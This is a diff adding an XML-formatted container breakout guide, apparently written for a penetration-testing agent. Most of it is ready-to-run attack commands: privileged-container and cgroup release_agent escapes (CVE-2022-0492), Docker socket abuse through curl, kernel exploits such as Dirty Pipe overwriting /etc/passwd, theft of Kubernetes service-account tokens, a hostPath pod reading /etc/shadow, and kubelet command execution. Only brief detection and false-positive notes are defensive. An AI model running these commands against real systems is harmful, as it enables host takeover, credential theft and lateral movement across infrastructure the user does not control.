@@ -1,0 +1,281 @@
+<vulnerability_guide>
+  <title>ADVANCED CONTAINER BREAKOUT AND ESCAPE TECHNIQUES</title>
+
+  <critical>Container breakout allows attackers to escape container isolation and access the host system or other containers. While containers provide process isolation, misconfigurations, kernel vulnerabilities, and excessive privileges create escape paths. Container escape typically leads to full node compromise in Kubernetes environments and lateral movement across the infrastructure.</critical>
+
+  <scope>
+    - Privileged container escape
+    - Capability abuse (CAP_SYS_ADMIN, CAP_NET_ADMIN, etc.)
+    - Kernel vulnerability exploitation
+    - Mount namespace escapes
+    - Container runtime vulnerabilities
+    - Kubernetes-specific breakouts
+    - Shared resource exploitation
+  </scope>
+
+  <methodology>
+    1. **Enumerate container context**: Identify runtime, privileges, and capabilities
+    2. **Check mounted resources**: Find sensitive host paths and sockets
+    3. **Identify misconfigurations**: Look for privileged mode and dangerous capabilities
+    4. **Test kernel exploits**: If kernel is vulnerable, attempt escape
+    5. **Exploit runtime**: Target container runtime vulnerabilities
+    6. **Pivot**: Move to host or other containers
+  </methodology>
+
+  <advanced_techniques>
+    <container_enumeration>
+      Identify container environment:
+      {% raw %}
+      # Detect containerization
+      cat /proc/1/cgroup | grep -E "docker|kubepods|containerd"
+      ls -la /.dockerenv
+      cat /proc/self/mountinfo | grep -E "overlay|aufs"
+
+      # Check container runtime
+      cat /proc/1/cmdline
+      ls /run/containerd/containerd.sock
+      ls /var/run/docker.sock
+
+      # Enumerate capabilities
+      cat /proc/self/status | grep Cap
+      capsh --print
+
+      # Check security context
+      cat /proc/self/attr/current  # SELinux
+      cat /proc/self/attr/apparmor/current  # AppArmor
+
+      # Check privileged mode
+      cat /proc/self/status | grep -i seccomp
+      # Seccomp: 0 = privileged, 2 = filtered
+
+      # Enumerate mounts
+      cat /proc/mounts
+      mount | grep -E "docker|kube|host"
+      {% endraw %}
+    </container_enumeration>
+
+    <privileged_container_escape>
+      Escape from privileged containers:
+      {% raw %}
+      # Method 1: Mount host filesystem
+      mkdir /mnt/host
+      mount /dev/sda1 /mnt/host
+      chroot /mnt/host /bin/bash
+
+      # Method 2: Access host via /proc
+      # If /proc/sys/kernel/core_pattern is writable
+      echo '|/path/to/malicious/script' > /proc/sys/kernel/core_pattern
+      # Trigger core dump to execute on host
+
+      # Method 3: Load kernel module
+      insmod /path/to/malicious.ko
+
+      # Method 4: Cgroup escape (CVE-2022-0492)
+      mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+      mkdir /tmp/cgrp/x
+      echo 1 > /tmp/cgrp/x/notify_on_release
+      host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+      echo "$host_path/cmd" > /tmp/cgrp/release_agent
+      echo '#!/bin/sh' > /cmd
+      echo "cat /etc/shadow > /output" >> /cmd
+      chmod +x /cmd
+      sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+      # Method 5: Abuse host PID namespace
+      # If --pid=host
+      nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+      {% endraw %}
+    </privileged_container_escape>
+
+    <capability_abuse>
+      Exploit dangerous capabilities:
+      {% raw %}
+      # CAP_SYS_ADMIN - Most dangerous
+      # Can mount filesystems, access /dev, modify namespace
+      mount -t proc proc /mnt
+      mount --bind /etc/shadow /mnt/shadow
+
+      # CAP_SYS_PTRACE - Debug processes
+      # Attach to host processes if PID namespace shared
+      strace -p 1
+      gdb -p $(pgrep sshd)
+
+      # CAP_NET_ADMIN - Network manipulation
+      # ARP spoofing, traffic interception
+      ip link add dummy0 type dummy
+      iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+      # CAP_DAC_READ_SEARCH - Bypass file read permission
+      # Read any file regardless of permissions
+      cat /etc/shadow  # Works even without read permission
+
+      # CAP_SYS_MODULE - Load kernel modules
+      # Load malicious kernel module
+      insmod rootkit.ko
+
+      # CAP_NET_RAW - Raw socket access
+      # Network sniffing and packet injection
+      tcpdump -i eth0
+      {% endraw %}
+    </capability_abuse>
+
+    <docker_socket_escape>
+      Escape via exposed Docker socket:
+      {% raw %}
+      # Check for Docker socket
+      ls -la /var/run/docker.sock
+
+      # Method 1: Create privileged container
+      docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -n -i bash
+
+      # Method 2: Mount host root
+      docker run -it -v /:/host ubuntu chroot /host /bin/bash
+
+      # Method 3: Using curl (no docker client)
+      curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+      # Create container with host mount
+      curl -s -X POST --unix-socket /var/run/docker.sock \
+        -H "Content-Type: application/json" \
+        -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}' \
+        http://localhost/containers/create
+
+      # Start and exec into container
+      curl -s -X POST --unix-socket /var/run/docker.sock \
+        http://localhost/containers/[ID]/start
+      {% endraw %}
+    </docker_socket_escape>
+
+    <kernel_exploits>
+      Exploit kernel vulnerabilities:
+      {% raw %}
+      # Dirty COW (CVE-2016-5195)
+      # Affects kernels < 4.8.3
+      gcc -pthread dirty.c -o dirty -lcrypt
+      ./dirty password
+
+      # Dirty Pipe (CVE-2022-0847)
+      # Affects kernels 5.8 - 5.16.11
+      ./exploit /etc/passwd 1 $'root:$1$attacker:0:0:root:/root:/bin/bash\n'
+
+      # OverlayFS (CVE-2021-3493)
+      # Ubuntu kernel privilege escalation
+      unshare -rm sh -c "mkdir l u w m && cp /u*/telegramme l/ && setcap cap_setuid+eip l/telegramme && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/* && u/telegramme"
+
+      # Netfilter (CVE-2022-25636)
+      # Kernel heap overflow
+      ./exploit_nf
+
+      # Check kernel version
+      uname -r
+      cat /proc/version
+
+      # Search for exploits
+      searchsploit linux kernel 5.x
+      {% endraw %}
+    </kernel_exploits>
+
+    <kubernetes_specific_escapes>
+      Kubernetes-specific breakout techniques:
+      {% raw %}
+      # Service account token abuse
+      cat /var/run/secrets/kubernetes.io/serviceaccount/token
+      KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+      curl -k -H "Authorization: Bearer $KUBE_TOKEN" \
+        https://kubernetes.default.svc/api/v1/namespaces/default/pods
+
+      # If SA has cluster-admin or can create pods:
+      # Create pod with hostPath mount
+      kubectl run pwned --image=alpine --overrides='
+      {
+        "spec": {
+          "containers": [{
+            "name": "pwned",
+            "image": "alpine",
+            "command": ["/bin/sh", "-c", "cat /host/etc/shadow"],
+            "volumeMounts": [{
+              "name": "host",
+              "mountPath": "/host"
+            }]
+          }],
+          "volumes": [{
+            "name": "host",
+            "hostPath": {"path": "/", "type": "Directory"}
+          }]
+        }
+      }'
+
+      # Node API access
+      curl -k https://$(hostname):10250/pods
+      curl -k https://$(hostname):10250/run/default/pod/container -d "cmd=id"
+
+      # etcd access (if exposed)
+      ETCDCTL_API=3 etcdctl get / --prefix --keys-only
+      {% endraw %}
+    </kubernetes_specific_escapes>
+
+    <shared_resource_exploitation>
+      Exploit shared namespaces and resources:
+      {% raw %}
+      # Shared PID namespace
+      ps aux  # Can see host processes
+      kill -9 1  # Can kill init
+      cat /proc/1/environ  # Read host process environment
+
+      # Shared network namespace
+      # Container can see host network traffic
+      tcpdump -i any
+      ss -tlnp  # See all listening services
+
+      # Shared IPC namespace
+      ipcs  # List shared memory segments
+      # Can communicate with host processes
+
+      # /proc exploitation
+      cat /proc/1/root/etc/shadow  # Access host files via PID 1
+
+      # Host path mounts
+      # If any host path is mounted:
+      find / -type f -name "*.key" 2>/dev/null
+      cat /host-path/etc/shadow
+      {% endraw %}
+    </shared_resource_exploitation>
+  </advanced_techniques>
+
+  <validation>
+    - Successfully access host filesystem from container
+    - Execute commands on host system
+    - Read sensitive host files (shadow, credentials)
+    - Escape container using specific technique (socket, capabilities, kernel)
+    - Demonstrate pivot to other containers or nodes
+  </validation>
+
+  <false_positives>
+    - Intentionally privileged containers (monitoring, security tools)
+    - Host path mounts with read-only access
+    - Containers in their own PID/network namespace (isolated)
+    - Containers with seccomp profiles blocking escape
+  </false_positives>
+
+  <detection_indicators>
+    - Mount operations from within containers
+    - Docker socket access from unexpected containers
+    - Kernel module loading attempts
+    - Process injection across namespaces
+    - Access to /proc/1 or host PIDs
+  </detection_indicators>
+
+  <pro_tips>
+    - Docker socket mount is the most common escape vector
+    - Privileged containers can do almost anything on the host
+    - Check for any capability beyond the default minimal set
+    - /proc and /sys mounts can leak host information
+    - Kubernetes service account tokens may have excessive permissions
+    - Container runtime vulnerabilities periodically discovered - check versions
+    - Seccomp and AppArmor profiles significantly reduce attack surface
+    - HostPID and hostNetwork are dangerous but sometimes necessary
+  </pro_tips>
+
+  <remember>Container isolation is only as strong as its configuration. A single privileged container, mounted socket, or dangerous capability can compromise the entire host and all containers running on it.</remember>
+</vulnerability_guide>
